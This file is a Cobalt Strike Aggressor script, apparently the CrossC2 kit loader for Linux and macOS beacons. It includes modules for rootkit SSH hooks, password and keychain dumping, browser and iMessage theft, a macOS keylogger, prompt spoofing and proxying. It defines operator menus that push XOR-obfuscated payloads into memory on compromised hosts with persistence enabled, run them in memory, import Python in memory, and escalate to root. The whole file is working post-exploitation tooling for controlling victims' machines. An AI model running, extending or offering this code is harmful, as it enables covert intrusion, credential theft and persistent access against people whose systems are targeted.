
include(script_resource("jobs/cc2_jobs.cna"));
include(script_resource("script/runScript.cna"));
include(script_resource("script/python-import.cna"));
include(script_resource("proxy/frp/cc2_frp.cna"));
include(script_resource("rootkit/auth/cc2_ssh.cna"));
include(script_resource("rootkit/auth/cc2_auth.cna"));
include(script_resource("scanner/ServerScan/serverscan.cna"));
include(script_resource("gather/password/mimipenguin/cc2_mimipenguin.cna"));
include(script_resource("gather/prompt/osx/cc2_prompt_spoof_dylib.cna"));
include(script_resource("gather/keylogger/osx/keylogger_osx2.cna"));
include(script_resource("gather/browser/safari_dump.cna"));
include(script_resource("gather/browser/chrome_dump.cna"));
include(script_resource("gather/keychain/keychain_dump.cna"));
include(script_resource("gather/message/iMessage_dump.cna"));
include(script_resource("utils/portscan_result.cna"));

sub openMemoryFileLoadDialogCallBack {
    $taskFile = $3['taskFile'];
    $fileAliasName = $3['fileAliasName'];
    $taskType = $3['taskType'];
    $taskResType = $3['taskResType'];
    $taskNeedRun = $3['taskNeedRun'];
    $taskNeedPersistence = $3['taskNeedPersistence'];
    $taskXorKey = $3['taskXorKey'];

    $transportArg = "";
    bcrossc2_load_dyn_pro($beaconid, $taskType, $fileAliasName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $taskFile, $transportArg);
}

sub openMemoryFileLoadDialog {
    $beaconid = $1;
    $dialog = dialog("MemoryFile Loader", %(beaconid => $beaconid, taskFile => "", fileAliasName => "", taskType => "", taskResType => "", taskNeedRun => "", taskNeedPersistence => "yes", taskXorKey => "13"), &openMemoryFileLoadDialogCallBack);
    dialog_description($dialog, "load file to memory");

    # fileAliasName // 别名 
    # fileName //真实文件名 -> 文件浏览器中获取
    # taskType = "so"; 文件类型 / 选择器
    # taskResType = "info"; # 文件执行结果 / 选择器
    # taskNeedRun = "Y"; # taskNeedRun -> Y / N
    # taskNeedPersistence = "N"; # taskNeedPersistence -> Y / N
    # taskXorKey = 13; # taskXorKey 文件内容Xor加密key

    drow_file($dialog, "taskFile", "Choose: ");
    drow_text($dialog, "fileAliasName", "fileAliasName: ", "fileAliasName"); # 这里为木马下发的别名
    drow_combobox($dialog, "taskType", "taskType: ", @("so/dylib", "ELF/MachO"));
    drow_combobox($dialog, "taskResType", "taskResType: ", @("info", "portscan", "credentials", "keystrokes", "screenshot", "no-info"));
    drow_combobox($dialog, "taskNeedRun", "taskNeedRun: ", @("no", "yes"));
    $taskNeedPersistence = "Y";
    drow_text($dialog, "taskXorKey", "taskXorKey(1-255): ", 13); # 这里的xorKey可以改为随机

    dbutton_action($dialog, "load");
    dialog_show($dialog);
}

sub openPythonImportDialogDialogCallBack {
    $pythonFile = $3['pythonFile'];
    blog($beaconid, $pythonFile);
    $taskResType = "info"; # info -> normal message
    $scriptType = 'python-import$';
    $scriptEnginePath = 'null';
    $scriptLocalPath = $pythonFile;
    $transportArg = '';

    $pathIndex = lindexOf($scriptLocalPath, '/');
    $pathIndex += 1;
    $filename = substr($scriptLocalPath, $pathIndex);

    $importName = substr($filename, 0, lindexOf($filename, '.'));
    blog($1, "[Python]: import ".$importName);
    $scriptType = $scriptType.$importName;

    if ($scriptType && $scriptLocalPath) {
        if (indexOf($scriptType, "/")) {
            $scriptEnginePath = $scriptType;
        }
        brun_script_in_mem($beaconid, $scriptType, $scriptEnginePath, $taskResType, $scriptLocalPath, $transportArg);
    } else {
        berror($beaconid, "*[error]: error script load");
        printUsage_importscript($beaconid);
    }
}

sub openPythonImportDialog {
    $beaconid = $1;
    $dialog = dialog("Python-import", %(beaconid => $beaconid, pythonFile => ""), &openPythonImportDialogDialogCallBack);
    dialog_description($dialog, "import python file");

    drow_file($dialog, "pythonFile", "Choose *.py file: ");

    dbutton_action($dialog, "load");
    dialog_show($dialog);
}


sub openRunMemoryFileDialogCallBack {
    $fileAliasName = $3['fileAliasName'];
    $processName = $3['processName'];
    $taskArgs = $3['taskArgs'];
    $taskType = runType($3['taskType']);
    if ($taskType eq "0") {
        $shell = "cc2-run ".$fileAliasName." ".$processName." ".$taskArgs;
    } else {
        $shell = "cc2-run ".$fileAliasName." ".$taskArgs;
    }
    blog($beaconid, "[shell]: shell ".$shell);
    bshell($beaconid, $shell);
}

sub openRunMemoryFileDialog {
    $beaconid = $1;
    $dialog = dialog("Run MemoryFile", %(beaconid => $beaconid, fileAliasName => "fileAliasName", processName => "processName (ELF/MachO need)", taskType => "", taskArgs => "taskArgs"), &openRunMemoryFileDialogCallBack);
    dialog_description($dialog, "run executable file from memory");

    drow_text($dialog, "fileAliasName", "fileAliasName: ", "fileAliasName"); 
    drow_text($dialog, "processName", "processName: ", "processName");
    drow_combobox($dialog, "taskType", "taskType: ", @("ELF/MachO", "so/dylib"));
    drow_text($dialog, "taskArgs", "taskArgs: ", "taskArgs");

    dbutton_action($dialog, "load");
    dialog_show($dialog);
}

sub openSetEnvDialogCallBack {
    $envKey = $3['envKey'];
    $envValue = $3['envValue'];
    blog($beaconid, "[shell]: shell setenv $envKey $envValue");
    bshell($beaconid, "setenv $envKey $envValue");
}

sub openSetEnvDialog {
    $beaconid = $1;
    $dialog = dialog("Set Env", %(beaconid => $beaconid, envKey => "TEST_PATH", envValue => "/usr/bin/:/usr/sbin/:/bin/:/sbin/"), &openSetEnvDialogCallBack);
    dialog_description($dialog, "setenv");

    drow_text($dialog, "envKey", "envKey: ", ""); 
    drow_text($dialog, "envValue", "envValue: ", "");

    dbutton_action($dialog, "set");
    dialog_show($dialog);
}


popup ssh {
    menu "&Access" {
        item "&Elevate" { openElevateDialog($1); }
    }
    menu "&Explore" {
        item "&File Browser" { 
            local('$bid');
            foreach $bid ($1) {
                openFileBrowser($bid);
            }
        }
        item "&Process List" { openProcessBrowser($1); }
    }
    menu "&CrossC2 Kit" {
        menu "&executable" {
            item "&list" {
                blog($1, "[shell]: shell cc2-memoryList");
                bshell($1, "cc2-memoryList");
            }
            item "&load" {
                openMemoryFileLoadDialog($1);
            }
            item "&run" {
                openRunMemoryFileDialog($1);
            }
            #item "&unload" {
            #}
        }
        item "&setenv" {
            openSetEnvDialog($1);
        }
        item "&python-import" {
            openPythonImportDialog($1);
        }
    }
    item "&Spawn" { 
        local('$bid');
        foreach $bid ($1) {
            blog($bid, "[shell]: shell spawn");
            bshell($bid, "spawn");
        }
    }
}

ssh_alias spawn {
    blog($1, "[shell]: shell spawn");
    bshell($1, "spawn");
}

ssh_alias getsystem {
    blog($1, "[shell]: shell getsystem");
    bshell($1, "getsystem");
}

ssh_alias setenv {
    if($2 && $3){
        blog($1, "[shell]: shell setenv $2 $3");
        bshell($1, "setenv $2 $3");
    } else {
        berror($1, "*[error]: setenv env_name env_value");
    }
}
ssh_command_register("spawn", "Spawn a new session");
ssh_command_register("getsystem", "Promote the session with uid=0 temporary permission to root session");
ssh_command_register("setenv", "Set the environment variables of the session", "\nUsage: setenv <EnvName> <EnvValue> \n\tsetenv PATH ./:/usr/bin/\n");

# Useful aliases, placed in kitloader because I always have this loaded
# from 'Und3rf10w - KitLoader.cna'

ssh_alias ls {
    if(!$2){
        bshell($1, "ls -la");
    } else {
        bshell($1, "ls -la $2");
    }
}

ssh_command_register("ls", "Lists files", "Use: ls [folder]\n\nLists files in a folder");

ssh_alias cat {
    if ($2){
        bshell($1, "cat $2");
    } else {
        berror($1, "Error: You must specify a file");
    }
}
ssh_command_register("cat", "Displays the contents of a file", "Use: cat [file]\n\nDisplays the contents of [file]");

ssh_alias tail {
    if ($2){
        bshell($1, "tail $2");
    } else {
        berror($1, "Error: You must specify a file");
    }
}
ssh_command_register("tail", "Print the last 10 lines of a file", "Use: tail [file]\n\nDisplays last 10 lines of [file]");

ssh_alias head {
    if ($2){
        bshell($1, "head $2");
    } else {
        berror($1, "Error: You must specify a file");
    }
}
ssh_command_register("head", "Print the first 10 lines of a file", "Use: head [file]\n\nDisplays first 10 lines of [file]");

ssh_alias ps {
    bshell($1, "ps aux");
}
ssh_command_register("ps", "Show process list", "Use: ps\n\nShows a list of processes");
